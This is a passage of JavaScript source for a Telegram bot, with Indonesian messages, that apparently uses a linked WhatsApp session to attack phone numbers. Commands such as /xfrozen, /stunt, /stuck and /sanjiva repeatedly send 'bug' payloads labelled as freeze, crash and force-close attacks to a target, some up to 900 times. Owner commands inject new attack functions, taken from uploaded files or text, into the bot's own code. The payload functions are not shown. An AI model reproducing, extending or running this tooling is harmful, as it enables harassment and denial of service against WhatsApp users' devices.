    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${cmdName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)for \\(let i = 0; i < (\\d+); i\\+\\+\\) \\{([\\s\\S]*?)await ${functionName}\\(sock, target\\);([\\s\\S]*?)\\n    \\}([\\s\\S]*?)\\n\\}\\);`, 'g');
    
    let matchFound = commandRegex.exec(content);
    if (!matchFound) {
      return false;
    }
    
    const oldLoopCount = matchFound[3];
    const beforeAwait = matchFound[4];
    const afterAwait = matchFound[5];
    
    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {${beforeAwait}await ${functionName}(sock, target);${afterAwait}    }`;
    
    const oldLoopRegex = new RegExp(`for \\(let i = 0; i < ${oldLoopCount}; i\\+\\+\\) \\{[\\s\\S]*?\\n    \\}`);
    const newContent = content.replace(oldLoopRegex, newLoopCode);
    
    fs.writeFileSync(__filename, newContent);
    return true;
  } catch (error) {
    console.error("Error updating command with new function:", error);
    return false;
  }
}

bot.onText(/\/updatecmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  if (!match || !match[1]) {
    await bot.sendMessage(chatId, "❌ Format: /updatecmd <cmdName>,<loopCount>,<sleepMs>\n\nAtau reply file .js untuk update fungsi juga:\n/updatecmd <cmdName>,<loopCount>,<sleepMs>\n\nContoh: /updatecmd xspam,5,2000");
    return;
  }
  
  const args = match[1].split(',');
  if (args.length < 3) {
    await bot.sendMessage(chatId, "❌ Format: /updatecmd <cmdName>,<loopCount>,<sleepMs>");
    return;
  }
  
  const cmdName = args[0].trim().replace('/', '');
  const loopCount = parseInt(args[1].trim());
  const sleepMs = parseInt(args[2].trim());
  
  if (isNaN(loopCount) || isNaN(sleepMs)) {
    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
    return;
  }
  
  const hasFileReply = msg.reply_to_message && msg.reply_to_message.document;
  
  if (hasFileReply) {
    const fileId = msg.reply_to_message.document.file_id;
    const fileName = msg.reply_to_message.document.file_name;
    
    if (!fileName.endsWith('.js')) {
      await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
      return;
    }
    
    await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} dengan file ${fileName}...`);
    
    try {
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'text' });
      let functionBody = response.data.trim();
      
      const functionNameMatch = functionBody.match(/(?:async )?function\s+(\w+)\s*\(/);
      if (!functionNameMatch) {
        await bot.sendMessage(chatId, "❌ Tidak dapat menemukan nama fungsi di file!");
        return;
      }
      
      const functionName = functionNameMatch[1];
      
      if (!functionBody.includes('async function')) {
        functionBody = `async ${functionBody}`;
      }
      
      const success = await updateCommandWithNewFunction(cmdName, loopCount, sleepMs, functionBody, functionName);
      
      if (success) {
        await bot.sendMessage(chatId, `✅ BERHASIL UPDATE COMMAND /${cmdName} DENGAN FUNGSI BARU!
        
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms
⚡ Function Baru: ${functionName}

🔄 Restarting bot dalam 3 detik...`);
        
        setTimeout(() => {
          process.exit(0);
        }, 3000);
      } else {
        await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada dan dibuat dengan /addfunccmd.`);
      }
      
    } catch (error) {
      console.error("Error in updatecmd with file:", error);
      await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
    
  } else {
    await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} (hanya loop & sleep)...`);
    
    const success = await updateCommandOnly(cmdName, loopCount, sleepMs);
    
    if (success) {
      await bot.sendMessage(chatId, `✅ BERHASIL UPDATE COMMAND /${cmdName}!
      
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms

🔄 Restarting bot dalam 3 detik...`);
      
      setTimeout(() => {
        process.exit(0);
      }, 3000);
    } else {
      await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada dan dibuat dengan /addfunccmd.`);
    }
  }
});

// ================= FITUR ADD FUNC CMD ================= //

async function addNewFunctionToFile(functionBody, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const bugFunctionsSection = "// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //";
    const insertPoint = content.indexOf(bugFunctionsSection);
    
    if (insertPoint === -1) {
      return false;
    }
    
    const existingFunctionCheck = new RegExp(`async function ${functionName}\\s*\\(`, 'g');
    if (existingFunctionCheck.test(content)) {
      return true;
    }
    
    const lines = content.split('\n');
    let lastFunctionLine = insertPoint;
    for (let i = insertPoint; i < lines.length; i++) {
      if (lines[i].startsWith('async function') || (lines[i].includes('async function') && lines[i].includes('{'))) {
        lastFunctionLine = i;
      }
      if (lines[i].includes('// ================= HELPER FUNCTIONS')) {
        break;
      }
    }
    
    const finalFunctionBody = functionBody.includes('async function') ? functionBody : `async ${functionBody}`;
    const functionCode = finalFunctionBody + '\n\n';
    lines.splice(lastFunctionLine + 1, 0, functionCode);
    
    fs.writeFileSync(__filename, lines.join('\n'));
    return true;
  } catch (error) {
    console.error("Error adding new function:", error);
    return false;
  }
}

async function addNewCommand(cmdName, loopCount, sleepMs, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const commandTemplate = `
bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("${cmdName}", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = \`\${formattedNumber}@s.whatsapp.net\`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, \`✅ ${cmdName} (bug) selesai untuk \${formattedNumber}\`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: \`https://wa.me/\${formattedNumber}\` }]
        ]
      }
    });
    
    for (let i = 0; i < ${loopCount}; i++) {
      await ${functionName}(sock, target);
      await sleep(${sleepMs});
      console.log(chalk.green(\`✅ Success Sending to \${target}\`));
    }
    
  } catch (error) {
    console.error("Error in ${cmdName}:", error);
  }
});`;

    const menuButtonSection = "const mainMenuButtons = {";
    const insertPoint = content.indexOf(menuButtonSection);
    
    if (insertPoint === -1) {
      return false;
    }
    
    const lines = content.split('\n');
    lines.splice(insertPoint, 0, commandTemplate);
    
    fs.writeFileSync(__filename, lines.join('\n'));
    
    let newContent = fs.readFileSync(__filename, "utf8");
    const menuTextOld = newContent.match(/const menuText = `([\\s\\S]*?)`;/);
    if (menuTextOld) {
      let newMenuText = menuTextOld[1];
      const cmdLine = `│ ❀ /${cmdName} <number> - custom bug\n`;
      const insertMenuPoint = newMenuText.indexOf('╰═════════════════❀');
      if (insertMenuPoint !== -1) {
        newMenuText = newMenuText.slice(0, insertMenuPoint) + cmdLine + newMenuText.slice(insertMenuPoint);
        const newContent2 = newContent.replace(menuTextOld[0], `const menuText = \`${newMenuText}\`;`);
        fs.writeFileSync(__filename, newContent2);
      }
    }
    
    return true;
  } catch (error) {
    console.error("Error adding new command:", error);
    return false;
  }
}

// Fitur /addfunccmd dengan dukungan reply file ATAU langsung teks
bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  if (!match || !match[1]) {
    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara 1 (Reply file .js):\nKirim file .js, lalu reply file tersebut dengan perintah ini.\n\nCara 2 (Reply teks):\nKirim fungsi sebagai teks, lalu reply pesan fungsi tersebut dengan perintah ini.\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
    return;
  }
  
  const args = match[1].split(',');
  if (args.length < 4) {
    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
    return;
  }
  
  const cmdName = args[0].trim().replace('/', '');
  const loopCount = parseInt(args[1].trim());
  const sleepMs = parseInt(args[2].trim());
  const functionName = args[3].trim();
  
  if (isNaN(loopCount) || isNaN(sleepMs)) {
    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
    return;
  }
  
  let functionBody = null;
  let source = "";
  
  if (msg.reply_to_message) {
    if (msg.reply_to_message.document) {
      const fileId = msg.reply_to_message.document.file_id;
      const fileName = msg.reply_to_message.document.file_name;
      
      if (!fileName.endsWith('.js')) {
        await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
        return;
      }
      
      source = "file";
      await bot.sendMessage(chatId, `🔄 Memproses file ${fileName}...`);
      
      try {
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'text' });
        functionBody = response.data.trim();
      } catch (error) {
        await bot.sendMessage(chatId, `❌ Gagal membaca file: ${error.message}`);
        return;
      }
      
    } else if (msg.reply_to_message.text) {
      source = "text";
      functionBody = msg.reply_to_message.text.trim();
      await bot.sendMessage(chatId, `🔄 Memproses fungsi dari pesan teks...`);
    }
  }
  
  if (!functionBody) {
    await bot.sendMessage(chatId, "❌ Reply ke file .js ATAU ke pesan teks yang berisi fungsi!\n\nKirim file .js atau tulis fungsi, lalu reply dengan /addfunccmd");
    return;
  }
  
  if (!functionBody.includes(`async function ${functionName}`) && !functionBody.includes(`function ${functionName}`)) {
    await bot.sendMessage(chatId, `❌ Fungsi dengan nama "${functionName}" tidak ditemukan di ${source === "file" ? "file" : "pesan"}!\n\nPastikan berisi:\nasync function ${functionName}(sock, target) { ... }`);
    return;
  }
  
  if (!functionBody.includes('async function')) {
    functionBody = `async ${functionBody}`;
  }
  
  const functionAdded = await addNewFunctionToFile(functionBody, functionName);
  
  if (!functionAdded) {
    await bot.sendMessage(chatId, `⚠️ Gagal menambah fungsi atau fungsi "${functionName}" sudah ada di index.js.`);
  } else {
    await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
  }
  
  const commandAdded = await addNewCommand(cmdName, loopCount, sleepMs, functionName);
  
  if (!commandAdded) {
    await bot.sendMessage(chatId, `❌ Gagal menambah command /${cmdName}.`);
    return;
  }
  
  await bot.sendMessage(chatId, `✅ BERHASIL MENAMBAH COMMAND BARU!
  
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms
⚡ Function: ${functionName}
📁 Source: ${source}

🔄 Restarting bot dalam 3 detik...`);
  
  setTimeout(() => {
    process.exit(0);
  }, 3000);
});

// ================= FITUR BARU ================= //

// Fitur /fullupdate
bot.onText(/\/fullupdate/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  await performFullUpdate(chatId);
});

// Fitur /cekupdate
bot.onText(/\/cekupdate/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  try {
    await bot.sendMessage(chatId, "🔍 Memeriksa update dari GitHub...");
    
    const updateCheck = await checkGitHubUpdate();
    
    if (updateCheck.error) {
      await bot.sendMessage(chatId, `❌ Gagal memeriksa update: ${updateCheck.error}`);
      return;
    }
    
    if (updateCheck.hasUpdate) {
      const localStats = fs.statSync(__filename);
      const localSize = (localStats.size / 1024).toFixed(2);
      const remoteSize = (updateCheck.remoteContent.length / 1024).toFixed(2);
      
      await bot.sendMessage(chatId, `✅ UPDATE TERSEDIA!
      
📦 Ukuran lokal: ${localSize} KB
📦 Ukuran remote: ${remoteSize} KB

Gunakan /fullupdate untuk mengupdate bot.`);
    } else {
      await bot.sendMessage(chatId, "✅ Bot sudah versi terbaru. Tidak ada update.");
    }
  } catch (error) {
    console.error("Error in cekupdate:", error);
    await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Fitur /onlygb <on/off>
bot.onText(/\/onlygb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const mode = match[1].toLowerCase();
  if (mode === "on") {
    saveGroupOnly("on");
    groupOnly = { mode: "on" };
    await bot.sendMessage(chatId, "✅ Mode Group Only: ON (bot hanya merespon di grup)");
  } else if (mode === "off") {
    saveGroupOnly("off");
    groupOnly = { mode: "off" };
    await bot.sendMessage(chatId, "✅ Mode Group Only: OFF (bot merespon di grup & private)");
  } else {
    await bot.sendMessage(chatId, "❌ Gunakan: /onlygb on atau /onlygb off");
  }
});

// Fitur /mode <on/off>
bot.onText(/\/mode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const mode = match[1].toLowerCase();
  if (mode === "on") {
    saveBotMode("on");
    botMode = { mode: "on" };
    await bot.sendMessage(chatId, "✅ Maintenance Mode: ON (hanya owner yang bisa akses)");
  } else if (mode === "off") {
    saveBotMode("off");
    botMode = { mode: "off" };
    await bot.sendMessage(chatId, "✅ Maintenance Mode: OFF (semua user bisa akses)");
  } else {
    await bot.sendMessage(chatId, "❌ Gunakan: /mode on atau /mode off");
  }
});

// Fitur /stopcmd <command>
bot.onText(/\/stopcmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  let command = match[1].toLowerCase().replace("/", "");
  let blocked = loadBlockedCommands();
  
  if (!blocked.includes(command)) {
    blocked.push(command);
    saveBlockedCommands(blocked);
    await bot.sendMessage(chatId, `✅ Command /${command} telah di-block`);
  } else {
    await bot.sendMessage(chatId, `⚠️ Command /${command} sudah dalam daftar block`);
  }
});

// Fitur /runcmd <command>
bot.onText(/\/runcmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  let command = match[1].toLowerCase().replace("/", "");
  let blocked = loadBlockedCommands();
  
  if (blocked.includes(command)) {
    blocked = blocked.filter(cmd => cmd !== command);
    saveBlockedCommands(blocked);
    await bot.sendMessage(chatId, `✅ Command /${command} telah di-unblock`);
  } else {
    await bot.sendMessage(chatId, `⚠️ Command /${command} tidak ada dalam daftar block`);
  }
});

// ================= BOT COMMANDS ================= //

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  bot.sendMessage(chatId, `╭═════════════════❀
│   ⚘ PRIMROSE LOTUS BOT ⚘
╰═════════════════❀
╭═════════════════❀
│  ⚘ SELAMAT DATANG DI WELCOME ⚘
│═════════════════❀
│ type /menu to see all commands
╰═════════════════❀`);
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("sanjiva", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ sanjiva (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 10; i++) {
      await delaynewinvisibleVnX(sock, target);
      await sleep(2);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in sanjiva:", error);
  }
});

bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("xtest", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 400; i++) {
      await StickerFC(sock, target);
      await sleep(2000);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in xtest:", error);
  }
});

bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("sanjixa", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ sanjixa (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 3; i++) {
      await VsxCrashDelay(sock, target);
      await sleep(300);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in sanjixa:", error);
  }
});

bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("xfrozen", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ xfrozen (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 300; i++) {
      await Freeze(sock, target);
      await sleep(3000);
      console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in xfrozen:", error);
  }
});

bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("stuck", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ stuck (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    await invisfcmsg(sock, target);
    await sleep(2000);
    
    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
    
  } catch (error) {
    console.error("Error in stuck:", error);
  }
});

bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("stunt", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ stunt (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 900; i++) {
      await FcCallInvisnew(sock, target);
      await sleep(2000);
      console.log(chalk.green(`✅ Success Sending FcCallInvisnew to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in stunt:", error);
  }
});

bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("streak", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    await VisiNoob(sock, target);
    
    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
    
  } catch (error) {
    console.error("Error in streak:", error);
  }
});

const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
      [{ text: "Channel Info", url: "t.me/allteamlinux" }]
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(__dirname, "assets", "images", imageName);
  if (!fs.existsSync(imagePath)) {
    return null;
  }
  return imagePath;
}

bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  const timescale = getUptime();
  
  const menuText = `\`\`\`
╭═════════════════❀ 
│   ⚘ PRIMROSE LINUX BOT ⚘
╰═════════════════❀
╭═════════════════❀
│  ⚘ BUG MENU ⚘
│ ❀ /sanjiva <number> - delay invis brutality combo
│ ❀ /sanjixa <number> - delay invis hard
│ ❀ /xfrozen <number> - freeze invisible 
│ ❀ /stunt <number> - fc call invis
│ ❀ /stuck <number> - fc invis msg andro 
╰═════════════════❀
╭═════════════════❀
│  ⚘ OWNER MENU ⚘
│ ❀ /addbot <number>
│ ❀ /addowner <userId>
│ ❀ /addprem <userId> 
│ ❀ /delowner <userId>
│ ❀ /delprem <userId>
│ ❀ /onlygb on/off
│ ❀ /mode on/off
│ ❀ /stopcmd <command>
│ ❀ /runcmd <command>
│ ❀ /fullupdate - update dari GitHub
│ ❀ /cekupdate - cek update GitHub
│ ❀ /addfunccmd - tambah cmd & fungsi (reply file ATAU teks)
│ ❀ /updatecmd - update loop/sleep/fungsi command
╰═════════════════❀\`\`\``;

  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    if (imagePath) {
      await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
        caption: menuText,
        parse_mode: "Markdown",
        ...mainMenuButtons,
      });
    } else {
      await bot.sendMessage(chatId, menuText, {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      });
    }
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(chatId, menuText, {
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      await bot.sendMessage(chatId, `⚠️ User ${userId} sudah premium.`);
      return;
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);
    await bot.sendMessage(chatId, `✅ User ${userId} ditambahkan ke premium.`);
  } catch (error) {
    console.error("Error adding premium user:", error);
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      await bot.sendMessage(chatId, `⚠️ User ${userId} tidak ditemukan di premium.`);
      return;
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);
    await bot.sendMessage(chatId, `✅ User ${userId} dihapus dari premium.`);
  } catch (error) {
    console.error("Error removing premium user:", error);
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";

    if (config.OWNER_ID.includes(newOwnerId)) {
      await bot.sendMessage(chatId, `⚠️ User ${newOwnerId} sudah menjadi owner.`);
      return;
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);
    await bot.sendMessage(chatId, `✅ User ${newOwnerId} ditambahkan sebagai owner.`);
  } catch (error) {
    console.error("Error adding owner:", error);
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
